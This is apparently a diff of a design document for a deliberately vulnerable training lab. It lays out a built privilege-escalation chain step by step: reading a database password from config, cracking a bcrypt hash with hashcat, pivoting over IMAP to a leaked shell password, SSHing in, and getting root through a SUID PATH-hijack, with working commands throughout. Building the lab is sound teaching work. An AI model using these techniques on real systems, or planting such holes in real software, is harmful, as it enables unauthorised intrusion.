@@ -1,55 +1,115 @@
-# Privilege escalation — reserved for the next build (Stages 4–5)
+# Privilege escalation — Stages 4–8 (BUILT)
 
-*Not built yet. This box currently ends at a `www-data` shell. This file records
-the design intent so the follow-up build starts from a known position and does
-not disturb Stages 1–3.*
+*This supersedes the original "reserved for the next build" plan. The chain
+below is implemented and tested. It no longer uses the `backup` vhost hook —
+that vhost stays inert set-dressing.*
 
-The chain to be built: **`www-data` → local user `siwang` → `root`.**
+The chain: **`www-data` (in the siwang container) → crack a reused password →
+read chrysanta's mailbox on the `smtp` container → SSH to `chrysanta` on the
+HOST → root on the HOST.**
 
-## Why it is deferred
+The endgame deliberately leaves the containers: Stages 7–8 live on the host, so
+the "container breakout" is by *credential*, not a runtime escape (see
+`UNINTENDED-PATHS.md` §10).
 
-The user chose to lock down and validate initial access (Stages 1–3) first, and
-plan privesc as a separate round. Building it now would mean guessing at
-decisions (which local user, which root vector) that are better made
-deliberately.
+---
 
-## The reserved hook: `backup.siwang.pineapple`
+## Stage 4 — loot the database (siwang container, as `www-data`)
 
-The `backup` vhost already exists and is deliberately empty. It was built into
-Stage 1 precisely so this phase has somewhere to live **without touching the
-Stage 1–3 Apache/PHP/DB config**. The in-world story already supports it: the
-brochure and the dev app both mention "nightly snapshots written to the
-operations backup host," and the backup stub page talks about restores.
+`www-data` can read `/var/www/dev/includes/config.php` (`0640 root:www-data`),
+which holds the app DB password in cleartext, and the `siwang_app` grant is
+`SELECT, INSERT, UPDATE ON siwang_dev.*`. So from the Stage 3 shell:
 
-## Candidate `www-data → siwang` vectors (decide next round)
+```sh
+mysql -h127.0.0.1 -usiwang_app -p'<DB_PASS from config.php>' siwang_dev \
+  -e "SELECT username,email,role,password_hash FROM users"
+```
 
-1. **Backup archive + credential reuse** *(front-runner in planning).*
-   A stale site/DB backup readable by `www-data` under the backup docroot (or
-   `/opt/backups`) containing the DB password; the local user `siwang` reuses
-   that password, so `su siwang` works. Reinforce with a crackable hash. Ties
-   the otherwise-inert backup vhost into the chain.
-2. **Readable SSH key** — passphrase-protected `id_rsa` left in the backup area,
-   crack with `ssh2john`. Requires SSH exposed to the student.
-3. **World-writable script consumed by a user cron** — faster but timing makes
-   the box feel flaky in class.
+The interesting row is **`chrysanta`** / `chrysanta@siwang-trading.example`,
+role `user`. Its bcrypt hash is the only crackable one in the table — `mika`
+(admin), `emma`, `svc_dms` all have long random passwords by design.
 
-## Candidate `siwang → root` vectors
+## Stage 5 — crack (attacker box)
 
-1. **`sudo` NOPASSWD backup script + `tar` wildcard injection** *(front-runner).*
-   `sudo -l` reveals `siwang` may run `/opt/backup/site-backup.sh` as root; the
-   script `tar`s a user-writable dir with a wildcard, so `--checkpoint-action`
-   injection yields a root shell. Continues the backup narrative, no timing
-   dependency, discoverable via `sudo -l`.
-2. **SUID binary with PATH hijack** — needs a compiled artifact in the build.
-3. **`sudo` on a GTFOBins binary** — reliable but a one-liner lookup, not much
-   of an exercise.
+```sh
+hashcat -m 3200 chrysanta.hash rockyou.txt      # or: john --format=bcrypt
+```
 
-## Guardrails to preserve when building this
+The password is **`dylan`** — an early rockyou entry, so bcrypt cost 10 falls in
+seconds–minutes. The lesson isn't the crack, it's what it unlocks next
+(credential reuse).
 
-- Do not weaken any Stage 1–3 control listed in `UNINTENDED-PATHS.md`.
-- The `siwang` local user and any sudo rule are created by a **new** installer
-  step, not by the current `install.sh`.
-- Keep "exactly one path": if the backup archive is the intended
-  `www-data→user` route, make sure the DB password isn't *also* trivially
-  readable somewhere else that skips it.
-- Re-run `verify.sh` plus new privesc checks after building.
+## Stage 6 — pivot to the mail host (`smtp` container)
+
+`smtp` (maddy, hostname `mail`) is on the **internal** `labnet` network only —
+never published to the host — so it is reachable *only from inside the siwang
+container*. Students tunnel through the `www-data` shell (or drop a client onto
+the box) and log in over IMAP with the reused password:
+
+```sh
+# from inside the siwang container / through the pivot
+python3 - <<'PY'
+import imaplib
+M=imaplib.IMAP4("mail",143)
+M.login("chrysanta@siwang-trading.example","dylan")
+M.select("INBOX")
+print(M.search(None,"BODY","password")[1])   # or read it all and sift
+PY
+```
+
+The inbox is ~12 ordinary staff emails plus **one** IT "password reset" notice.
+It leaks chrysanta's *shell* password on the operations host:
+
+```
+login:    chrysanta
+password: BenMyG0AT
+```
+
+## Stage 7 — SSH to the host
+
+The host has a local user `chrysanta` (created by `install/privesc-host.sh`)
+whose password is `BenMyG0AT`, with an sshd drop-in permitting password login
+for that one account. Host `:22` is reachable directly (the reused mail
+password is the whole point — the pivot was to *read* it):
+
+```sh
+ssh chrysanta@<host>          # password: BenMyG0AT
+```
+
+## Stage 8 — root on the host (SUID + PATH hijack)
+
+```sh
+find / -perm -4000 -type f 2>/dev/null      # -> /usr/local/bin/opsbackup
+strings /usr/local/bin/opsbackup            # -> runs "backup-check" by name
+mkdir -p ~/bin
+printf '#!/bin/bash\n/bin/bash -p\n' > ~/bin/backup-check
+chmod +x ~/bin/backup-check
+PATH="$HOME/bin:$PATH" /usr/local/bin/opsbackup   # -> root shell
+```
+
+`opsbackup` is SUID-root and `execlp("backup-check", …)`s a command by relative
+name after `setuid(0)`, trusting `$PATH`. Prepending a writable dir wins root.
+
+---
+
+## Provisioning / teardown
+
+- Containers: `cd defence/docker && docker compose up -d --build` builds both
+  `siwang` and `smtp`. The mailbox re-seeds on every mail-container start
+  (fresh tmpfs `/data`), matching the lab's reset-between-cohorts model.
+- **Host (Stages 7–8):** `sudo defence/install/privesc-host.sh --confirm`.
+  This is the *only* part that weakens the host (a password SSH account + a SUID
+  binary). It refuses to run without `--confirm`, supports `--dry-run`, and is
+  undone by `--uninstall` (also wired into `uninstall.sh --purge`).
+- Credentials live in exactly two places and must stay in sync:
+  `db/seed_users.php` (`chrysanta`/`dylan`) and `docker/smtp/seed-mail.sh` +
+  `install/privesc-host.sh` (`BenMyG0AT`).
+
+## Guardrails preserved
+
+- Stages 1–3 are untouched; `verify.sh` still reports **20/0**.
+- Exactly one crackable password (`dylan`), on a **non-admin** account, so it is
+  never a shortcut past Stage 2.
+- The DB password is not *also* trivially readable somewhere that skips Stage 4.
+- Both containers are hardened (`cap_drop`, narrowed cert mount; the mail box
+  additionally read-only + `no-new-privileges`). See `UNINTENDED-PATHS.md` §10.
